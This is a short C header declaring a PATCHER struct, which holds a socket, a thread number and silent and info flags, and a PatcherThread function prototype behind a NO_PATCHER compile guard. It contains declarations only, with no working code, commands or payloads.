#ifndef NO_PATCHER

typedef struct PATCHER {
	SOCKET Sock;
	int ThreadNum;
	BOOL Silent;
	BOOL GotInfo;

}PATCHER;

DWORD WINAPI PatcherThread(LPVOID param);

#endif